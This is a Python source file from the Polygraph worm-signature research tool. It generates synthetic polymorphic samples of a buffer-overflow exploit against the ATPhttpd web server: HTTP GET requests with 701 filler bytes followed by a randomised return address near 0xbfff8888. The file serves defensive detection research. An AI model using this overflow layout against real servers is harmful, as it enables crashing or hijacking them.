#      Polygraph (release 0.1)
#      Signature generation algorithms for polymorphic worms
#
#      Copyright (c) 2004-2005, Intel Corporation
#      All Rights Reserved
#
#  This software is distributed under the terms of the Eclipse Public
#  License, Version 1.0 which can be found in the file named LICENSE.
#  ANY USE, REPRODUCTION OR DISTRIBUTION OF THIS SOFTWARE CONSTITUTES
#  RECIPIENT'S ACCEPTANCE OF THIS AGREEMENT
import worm_gen
from worm_gen import random_bytes
import string
import random
import struct

class ATPhttpd(worm_gen.WormGen):
    """
    Synthetic polymorphic worm based on an exploit for the ATPhttpd web server.
    """

    def __init__(self, fname="atphttpd", 
                pname="ATPhttpd",
                ra = 0xbfff8888L, 
                modulation=0x7777,
#                ra=0xbffff69aL, modulation=1000, 
#                after_ra_len=300): 
                after_ra_len=109,
                extra_headers=False): 
        self.pname = pname
        self.fname = fname
        self.ra = ra
        self.modulation = modulation 
        self.after_ra_len = after_ra_len


    def generate(self, count):
        safe_chars = [chr(i) for i in xrange(256)]
        for i in string.whitespace:
            safe_chars.remove(i)
        safe_chars.remove(chr(0))

        samples = []
        for i in xrange(count):
            request = []
            request.append('GET /')
            request.append(random_bytes(701, safe_chars))
            this_ra = self.ra + random.randint(-self.modulation, 
                                                self.modulation)
            request.append(struct.pack('L', this_ra))
            request.append(random_bytes(self.after_ra_len, safe_chars)) 
            request.append(' HTTP/1.1')
            request.append('\r\n')

            yield(''.join(request))

    ports = property(lambda self: [80])
